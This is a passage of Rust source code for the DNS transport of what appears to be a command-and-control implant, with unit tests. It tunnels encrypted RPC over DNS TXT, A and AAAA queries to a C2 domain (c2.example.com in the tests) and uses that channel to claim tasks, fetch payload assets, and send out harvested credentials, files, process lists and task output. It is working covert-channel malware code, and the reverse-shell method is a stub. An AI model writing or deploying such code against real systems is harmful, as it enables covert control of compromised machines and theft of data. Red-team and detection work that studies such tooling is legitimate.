            // Response is chunked - fetch all chunks
            // For A/AAAA records, response may be padded with nulls
            let chunked_info = response_str[RESP_CHUNKED.len()..].trim_end_matches('\0');
            let parts: Vec<&str> = chunked_info.split(':').collect();

            if parts.len() != 2 {
                return Err(anyhow::anyhow!("Invalid chunked response format"));
            }

            let total_chunks = Self::decode_seq(parts[0])?;
            let expected_crc = Self::decode_base36_crc(parts[1])?;

            #[cfg(debug_assertions)]
            log::debug!(
                "Response is chunked: {} chunks, CRC={}",
                total_chunks,
                expected_crc
            );

            // Fetch all response chunks
            return self
                .fetch_response_chunks(conv_id, total_chunks, expected_crc)
                .await;
        } else if response_str.starts_with(RESP_ERROR) {
            return Err(anyhow::anyhow!("Server error: {}", response_str));
        }

        Err(anyhow::anyhow!("Unknown server response"))
    }

    /// Fetch chunked response from server
    /// For binary (A/AAAA): expected_crc is low byte only (0-255)
    /// For text (TXT): expected_crc is full 16-bit CRC
    async fn fetch_response_chunks(
        &mut self,
        conv_id: &str,
        total_chunks: usize,
        expected_crc: u16,
    ) -> Result<Vec<u8>> {
        // TXT uses base32-encoded text, A/AAAA use raw bytes
        let is_text_chunking = self.current_record_type == TXT_RECORD_TYPE;

        let mut encoded_response = String::new();
        let mut binary_response = Vec::new();

        // Fetch each chunk
        for seq in 0..total_chunks {
            let subdomain = self.build_packet(TYPE_FETCH, seq, conv_id, &[])?;
            let response = self.send_query(&subdomain).await?;

            if is_text_chunking {
                // TXT records: response is "ok:" prefix + base32 data
                let response_str = String::from_utf8_lossy(&response);
                if !response_str.starts_with(RESP_OK) {
                    return Err(anyhow::anyhow!(
                        "Failed to fetch chunk {}: {}",
                        seq,
                        response_str
                    ));
                }
                let chunk_data = &response_str[RESP_OK.len()..];
                encoded_response.push_str(chunk_data);
            } else {
                // A/AAAA records: response is raw binary data (no prefix)
                // Trim null bytes from AAAA padding (16-byte alignment)
                let trimmed_end = response
                    .iter()
                    .rposition(|&b| b != 0)
                    .map(|i| i + 1)
                    .unwrap_or(0);
                binary_response.extend_from_slice(&response[..trimmed_end]);
            }
        }

        // Send final fetch to signal cleanup (seq = total_chunks)
        let subdomain = self.build_packet(TYPE_FETCH, total_chunks, conv_id, &[])?;
        let _ = self.send_query(&subdomain).await; // Ignore response

        #[cfg(debug_assertions)]
        if is_text_chunking {
            log::debug!(
                "Fetched all {} chunks, total encoded size: {}",
                total_chunks,
                encoded_response.len()
            );
        } else {
            log::debug!(
                "Fetched all {} chunks, total binary size: {}",
                total_chunks,
                binary_response.len()
            );
        }

        // Decode based on chunking type
        let decoded = if is_text_chunking {
            // TXT: Decode base32
            Self::decode_base32(&encoded_response)?
        } else {
            // A/AAAA: Already binary
            binary_response
        };

        // Verify CRC
        let actual_crc = Self::calculate_crc16(&decoded);

        // For binary chunking (A/AAAA), we only have the low byte of the CRC
        // For text chunking (TXT), we have the full 16-bit CRC
        let crc_match = if is_text_chunking {
            actual_crc == expected_crc
        } else {
            (actual_crc & 0xFF) == (expected_crc & 0xFF)
        };

        if !crc_match {
            return Err(anyhow::anyhow!(
                "CRC mismatch on chunked response: expected {}, got {} (low byte check: {})",
                expected_crc,
                actual_crc,
                if is_text_chunking {
                    "full"
                } else {
                    "low byte only"
                }
            ));
        }

        #[cfg(debug_assertions)]
        log::debug!(
            "Successfully reassembled chunked response, {} bytes",
            decoded.len()
        );

        Ok(decoded)
    }

    /// Perform a DNS-based RPC exchange
    async fn dns_exchange(&mut self, method: &str, data: &[u8]) -> Result<Vec<u8>> {
        // Lazy initialize socket
        if self.socket.is_none() {
            let socket = UdpSocket::bind("0.0.0.0:0")
                .await
                .context("Failed to create UDP socket")?;
            self.socket = Some(std::sync::Arc::new(socket));
        }

        // Calculate CRC16 of the data
        let data_crc = Self::calculate_crc16(data);

        #[cfg(debug_assertions)]
        log::debug!(
            "DNS exchange: method={}, data_len={}, crc={}",
            method,
            data.len(),
            data_crc
        );

        // Calculate max data size based on domain length
        let max_data_size = self.calculate_max_data_size();

        // Split RAW BINARY data into chunks (no base32 encoding yet)
        let chunks: Vec<Vec<u8>> = data
            .chunks(max_data_size)
            .map(|chunk| chunk.to_vec())
            .collect();

        let total_chunks = chunks.len();

        #[cfg(debug_assertions)]
        log::debug!(
            "DNS exchange: chunks={}, max_data_size={}",
            total_chunks,
            max_data_size
        );

        // Step 1: Send init packet and get conversation ID
        let conv_id = self.send_init(method, total_chunks, data_crc).await?;

        // Step 2: Send data chunks
        self.send_chunks(&conv_id, &chunks, total_chunks).await?;

        // Step 3: Send end packet and get response
        let last_seq = total_chunks.saturating_sub(1);
        let response = self.send_end(&conv_id, last_seq).await?;

        // Step 4: Handle response (including retries for missing chunks)
        self.handle_response(&conv_id, &response, &chunks, 0).await
    }

    /// Perform a unary RPC call via DNS
    async fn unary_rpc<Req, Resp>(&mut self, request: Req, path: &str) -> Result<Resp>
    where
        Req: Message + Send + 'static,
        Resp: Message + Default + Send + 'static,
    {
        // Marshal and encrypt request
        let request_bytes = marshal_with_codec::<Req, Resp>(request)?;

        // Send via DNS
        let response_bytes = self.dns_exchange(path, &request_bytes).await?;

        // Unmarshal and decrypt response
        unmarshal_with_codec::<Req, Resp>(&response_bytes)
    }
}

impl Transport for DNS {
    fn init() -> Self {
        DNS {
            dns_server: None,
            dns_resolvers: Vec::new(),
            current_resolver_index: 0,
            base_domain: String::new(),
            socket: None,
            preferred_record_type: TXT_RECORD_TYPE,
            current_record_type: TXT_RECORD_TYPE,
            enable_fallback: true,
        }
    }

    fn new(callback: String, _proxy_uri: Option<String>) -> Result<Self> {
        // URL format: dns://<server|*>/<domain>[?type=TXT|A|AAAA&fallback=true|false]
        // Examples:
        //   dns://8.8.8.8/c2.example.com          - Specific server, TXT with fallback
        //   dns://*/c2.example.com?type=A         - System resolver, prefer A records
        //   dns://*/c2.example.com?fallback=false - TXT only, no fallback
        let url = callback.trim_start_matches("dns://");

        // Split URL and query params
        let (server_domain, query_params) = if let Some(idx) = url.find('?') {
            (&url[..idx], Some(&url[idx + 1..]))
        } else {
            (url, None)
        };

        let parts: Vec<&str> = server_domain.split('/').collect();

        if parts.len() != 2 {
            return Err(anyhow::anyhow!(
                "Invalid DNS callback format. Expected: dns://<server>/<domain>[?options]"
            ));
        }

        let dns_server = if parts[0] == "*" {
            // Use system resolver
            None
        } else if parts[0].contains(':') {
            Some(parts[0].to_string())
        } else {
            Some(format!("{}:53", parts[0]))
        };

        let base_domain = parts[1].to_string();

        // Parse query parameters
        let mut preferred_record_type = TXT_RECORD_TYPE;
        let mut enable_fallback = true;

        if let Some(params) = query_params {
            for param in params.split('&') {
                if let Some((key, value)) = param.split_once('=') {
                    match key {
                        "type" => {
                            preferred_record_type = match value.to_uppercase().as_str() {
                                "TXT" => TXT_RECORD_TYPE,
                                "A" => A_RECORD_TYPE,
                                "AAAA" => AAAA_RECORD_TYPE,
                                _ => {
                                    return Err(anyhow::anyhow!(
                                        "Invalid record type: {}. Expected TXT, A, or AAAA",
                                        value
                                    ))
                                }
                            };
                        }
                        "fallback" => {
                            enable_fallback = match value.to_lowercase().as_str() {
                                "true" | "1" | "yes" => true,
                                "false" | "0" | "no" => false,
                                _ => {
                                    return Err(anyhow::anyhow!(
                                        "Invalid fallback value: {}. Expected true or false",
                                        value
                                    ))
                                }
                            };
                        }
                        _ => {} // Ignore unknown parameters
                    }
                }
            }
        }

        // Build resolver array if using system resolver (dns_server is None)
        let dns_resolvers = if dns_server.is_none() {
            build_resolver_array()
        } else {
            Vec::new()
        };

        Ok(DNS {
            dns_server,
            dns_resolvers,
            current_resolver_index: 0,
            base_domain,
            socket: None,
            preferred_record_type,
            current_record_type: preferred_record_type, // Start with preferred type
            enable_fallback,
        })
    }

    async fn claim_tasks(&mut self, request: ClaimTasksRequest) -> Result<ClaimTasksResponse> {
        self.unary_rpc(request, CLAIM_TASKS_PATH).await
    }

    async fn fetch_asset(
        &mut self,
        request: FetchAssetRequest,
        tx: Sender<FetchAssetResponse>,
    ) -> Result<()> {
        #[cfg(debug_assertions)]
        let filename = request.name.clone();

        // Marshal request
        let request_bytes = marshal_with_codec::<FetchAssetRequest, FetchAssetResponse>(request)?;

        // Send via DNS and get streaming response
        let response_bytes = self.dns_exchange(FETCH_ASSET_PATH, &request_bytes).await?;

        // For streaming responses, we need to chunk them
        // The response contains multiple FetchAssetResponse messages concatenated
        let mut offset = 0;
        while offset < response_bytes.len() {
            if offset + 4 > response_bytes.len() {
                break;
            }

            // Read message length (first 4 bytes)
            let msg_len = u32::from_be_bytes([
                response_bytes[offset],
                response_bytes[offset + 1],
                response_bytes[offset + 2],
                response_bytes[offset + 3],
            ]) as usize;
            offset += 4;

            if offset + msg_len > response_bytes.len() {
                break;
            }

            // Decrypt and decode message
            match unmarshal_with_codec::<FetchAssetRequest, FetchAssetResponse>(
                &response_bytes[offset..offset + msg_len],
            ) {
                Ok(msg) => {
                    if tx.send(msg).is_err() {
                        #[cfg(debug_assertions)]
                        log::error!("Failed to send asset chunk: {}", filename);
                        break;
                    }
                }
                Err(_err) => {
                    #[cfg(debug_assertions)]
                    log::error!(
                        "Failed to decrypt/decode asset chunk: {}: {}",
                        filename,
                        _err
                    );
                    break;
                }
            }

            offset += msg_len;
        }

        Ok(())
    }

    async fn report_credential(
        &mut self,
        request: ReportCredentialRequest,
    ) -> Result<ReportCredentialResponse> {
        self.unary_rpc(request, REPORT_CREDENTIAL_PATH).await
    }

    async fn report_file(
        &mut self,
        request: Receiver<ReportFileRequest>,
    ) -> Result<ReportFileResponse> {
        #[cfg(debug_assertions)]
        log::debug!("report_file: starting to collect chunks");

        // Spawn a task to collect chunks from the sync channel receiver
        // This is necessary because iterating over the sync receiver would block the async task
        let handle = tokio::spawn(async move {
            let mut all_chunks = Vec::new();
            #[cfg_attr(not(debug_assertions), allow(unused_variables))]
            let mut chunk_count = 0;

            // Iterate over the sync channel receiver in a spawned task to avoid blocking
            for chunk in request {
                #[cfg(debug_assertions)]
                {
                    chunk_count += 1;
                }
                let chunk_bytes =
                    marshal_with_codec::<ReportFileRequest, ReportFileResponse>(chunk)?;
                all_chunks.extend_from_slice(&(chunk_bytes.len() as u32).to_be_bytes());
                all_chunks.extend_from_slice(&chunk_bytes);
            }

            #[cfg(debug_assertions)]
            log::debug!(
                "report_file: collected {} chunks, total {} bytes",
                chunk_count,
                all_chunks.len()
            );

            Ok::<Vec<u8>, anyhow::Error>(all_chunks)
        });

        // Wait for the spawned task to complete
        let all_chunks = handle
            .await
            .context("Failed to join chunk collection task")??;

        // Send via DNS
        let response_bytes = self.dns_exchange(REPORT_FILE_PATH, &all_chunks).await?;

        #[cfg(debug_assertions)]
        log::debug!(
            "report_file: received response, {} bytes",
            response_bytes.len()
        );

        // Unmarshal response
        unmarshal_with_codec::<ReportFileRequest, ReportFileResponse>(&response_bytes)
    }

    async fn report_process_list(
        &mut self,
        request: ReportProcessListRequest,
    ) -> Result<ReportProcessListResponse> {
        self.unary_rpc(request, REPORT_PROCESS_LIST_PATH).await
    }

    async fn report_task_output(
        &mut self,
        request: ReportTaskOutputRequest,
    ) -> Result<ReportTaskOutputResponse> {
        self.unary_rpc(request, REPORT_TASK_OUTPUT_PATH).await
    }

    async fn reverse_shell(
        &mut self,
        _rx: tokio::sync::mpsc::Receiver<ReverseShellRequest>,
        _tx: tokio::sync::mpsc::Sender<ReverseShellResponse>,
    ) -> Result<()> {
        Err(anyhow::anyhow!(
            "DNS transport does not support reverse shell"
        ))
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_dns_init_defaults() {
        let dns = DNS::init();

        assert!(dns.dns_server.is_none());
        assert!(dns.base_domain.is_empty());
        assert_eq!(dns.preferred_record_type, TXT_RECORD_TYPE);
        assert_eq!(dns.current_record_type, TXT_RECORD_TYPE);
        assert!(dns.enable_fallback);
    }

    #[test]
    fn test_dns_new_parses_callback() {
        // Test with specific DNS server
        let dns = DNS::new("dns://8.8.8.8/c2.example.com".to_string(), None).unwrap();
        assert_eq!(dns.dns_server, Some("8.8.8.8:53".to_string()));
        assert_eq!(dns.base_domain, "c2.example.com");
        assert_eq!(dns.preferred_record_type, TXT_RECORD_TYPE);
        assert!(dns.enable_fallback);

        // Test with system resolver (*)
        let dns = DNS::new("dns://*/c2.example.com".to_string(), None).unwrap();
        assert!(dns.dns_server.is_none());
        assert_eq!(dns.base_domain, "c2.example.com");

        // Test with A record type preference and fallback disabled
        let dns = DNS::new(
            "dns://*/c2.example.com?type=A&fallback=false".to_string(),
            None,
        )
        .unwrap();
        assert_eq!(dns.preferred_record_type, A_RECORD_TYPE);
        assert_eq!(dns.current_record_type, A_RECORD_TYPE);
        assert!(!dns.enable_fallback);
    }

    #[test]
    fn test_dns_new_invalid_type_errors() {
        let result = DNS::new("dns://8.8.8.8/c2.example.com?type=BOGUS".to_string(), None);
        assert!(result.is_err());
        let err_msg = result.unwrap_err().to_string();
        assert!(err_msg.contains("type") || err_msg.contains("BOGUS"));
    }

    #[test]
    fn test_calculate_max_data_size_positive() {
        let dns = DNS {
            dns_server: None,
            dns_resolvers: Vec::new(),
            current_resolver_index: 0,
            base_domain: "c2.example.com".to_string(),
            socket: None,
            preferred_record_type: TXT_RECORD_TYPE,
            current_record_type: TXT_RECORD_TYPE,
            enable_fallback: true,
        };

        let max_size = dns.calculate_max_data_size();
        assert!(max_size > 0, "max data size should be positive");

        // Test with a very long base domain - should be smaller
        let dns_long = DNS {
            dns_server: None,
            dns_resolvers: Vec::new(),
            current_resolver_index: 0,
            base_domain: "very.long.subdomain.hierarchy.for.testing.purposes.c2.example.com"
                .to_string(),
            socket: None,
            preferred_record_type: TXT_RECORD_TYPE,
            current_record_type: TXT_RECORD_TYPE,
            enable_fallback: true,
        };

        let max_size_long = dns_long.calculate_max_data_size();
        assert!(max_size_long > 0, "long domain max size should be positive");
        assert!(
            max_size_long < max_size,
            "longer domain should reduce available data size"
        );
    }

    #[test]
    fn test_generate_conv_id_length() {
        let id = DNS::generate_conv_id();
        assert_eq!(id.len(), CONV_ID_SIZE);

        // Verify all characters are base32 lowercase (a-z0-7)
        for c in id.chars() {
            assert!(
                c.is_ascii_lowercase() || c.is_ascii_digit(),
                "conv_id should contain only lowercase alphanumeric chars"
            );
        }
    }

    #[test]
    fn test_encode_decode_seq() {
        // Test round-trip encoding/decoding
        let test_values = vec![0, 1, 42, 1234, 60466175]; // Max is 36^5 - 1

        for val in test_values {
            let encoded = DNS::encode_seq(val);
            assert_eq!(encoded.len(), SEQ_SIZE);

            let decoded = DNS::decode_seq(&encoded).unwrap();
            assert_eq!(decoded, val, "seq {} should round-trip correctly", val);
        }
    }

    #[test]
    fn test_encode_decode_base36_crc() {
        // Test round-trip encoding/decoding
        let test_crcs = vec![0, 1, 255, 12345, 65535]; // 16-bit values

        for crc in test_crcs {
            let encoded = DNS::encode_base36_crc(crc as u16);
            assert_eq!(encoded.len(), 4);

            let decoded = DNS::decode_base36_crc(&encoded).unwrap();
            assert_eq!(
                decoded, crc as u16,
                "CRC {} should round-trip correctly",
                crc
            );
        }
    }

    #[test]
    fn test_calculate_crc16() {
        // Test with known data
        let data1 = b"hello world";
        let crc1 = DNS::calculate_crc16(data1);
        assert!(crc1 > 0, "CRC should be non-zero for non-empty data");

        // Same data should produce same CRC
        let crc1_again = DNS::calculate_crc16(data1);
        assert_eq!(crc1, crc1_again, "CRC should be deterministic");

        // Different data should produce different CRC (highly likely)
        let data2 = b"hello world!";
        let crc2 = DNS::calculate_crc16(data2);
        assert_ne!(crc1, crc2, "different data should produce different CRC");
    }

    #[tokio::test]
    async fn test_handle_response_ok_prefix() {
        // Create a mock DNS instance
        let mut dns = DNS::init();
        dns.base_domain = "example.com".to_string();

        // Simple test data
        let test_data = b"test response data";
        let encoded_data = DNS::encode_base32(test_data);
        let response = format!("{}{}", RESP_OK, encoded_data);

        // Call handle_response with empty chunks (no retries needed)
        let conv_id = "test12345678";
        let chunks: Vec<Vec<u8>> = vec![];

        let result = dns
            .handle_response(conv_id, response.as_bytes(), &chunks, 0)
            .await;

        assert!(result.is_ok());
        let decoded = result.unwrap();
        assert_eq!(decoded, test_data);
    }

    #[tokio::test]
    async fn test_handle_response_error_prefix() {
        let mut dns = DNS::init();
        dns.base_domain = "example.com".to_string();

        let response = b"e:something_broke";
        let conv_id = "test12345678";
        let chunks: Vec<Vec<u8>> = vec![];

        let result = dns.handle_response(conv_id, response, &chunks, 0).await;

        assert!(result.is_err());
        let err_msg = result.unwrap_err().to_string();
        assert!(err_msg.contains("something_broke") || err_msg.contains("error"));
    }

    #[tokio::test]
    async fn test_handle_response_missing_prefix() {
        let mut dns = DNS::init();
        dns.base_domain = "example.com".to_string();

        // Missing chunks response - should trigger retry or error
        let response = b"m:00000,00001,00002";
        let conv_id = "test12345678";
        let chunks: Vec<Vec<u8>> = vec![b"chunk0".to_vec(), b"chunk1".to_vec()];

        // With retry_count at max, this should error out
        let result = dns.handle_response(conv_id, response, &chunks, 5).await;

        // Should either error or handle the missing chunks
        // Since we're at max retries, it should error
        assert!(result.is_err());
    }

    #[tokio::test]
    async fn test_reverse_shell_not_supported() {
        let mut dns = DNS::init();

        let (_tx, rx) = tokio::sync::mpsc::channel(1);
        let (resp_tx, _resp_rx) = tokio::sync::mpsc::channel(1);

        let result = dns.reverse_shell(rx, resp_tx).await;

        assert!(result.is_err());
        let err_msg = result.unwrap_err().to_string();
        assert!(err_msg.contains("reverse shell") || err_msg.contains("not support"));
    }

    #[test]
    fn test_dns_new_with_wildcard_builds_resolver_array() {
        let dns = DNS::new("dns://*/c2.example.com".to_string(), None).unwrap();

        assert!(dns.dns_server.is_none(), "dns_server should be None for wildcard");
        assert!(!dns.dns_resolvers.is_empty(), "dns_resolvers array should be populated");

        // Should always have at least Cloudflare and Google fallbacks
        assert!(dns.dns_resolvers.len() >= 2, "Should have at least 2 resolvers (fallbacks)");

        // Check that Cloudflare and Google are in the list (they should be at the end)
        let has_cloudflare = dns.dns_resolvers.iter().any(|s| s == "1.1.1.1:53");
        let has_google = dns.dns_resolvers.iter().any(|s| s == "8.8.8.8:53");

        assert!(has_cloudflare, "Should have Cloudflare (1.1.1.1:53) in resolver list");
        assert!(has_google, "Should have Google (8.8.8.8:53) in resolver list");

        assert_eq!(dns.current_resolver_index, 0, "Should start at index 0");

        #[cfg(debug_assertions)]
        println!("Resolver array: {:?}", dns.dns_resolvers);
    }

    #[test]
    fn test_dns_new_with_explicit_server_no_resolver_array() {
        let dns = DNS::new("dns://8.8.8.8/c2.example.com".to_string(), None).unwrap();

        assert_eq!(dns.dns_server, Some("8.8.8.8:53".to_string()));
        assert!(dns.dns_resolvers.is_empty(), "dns_resolvers should be empty with explicit server");
    }
}
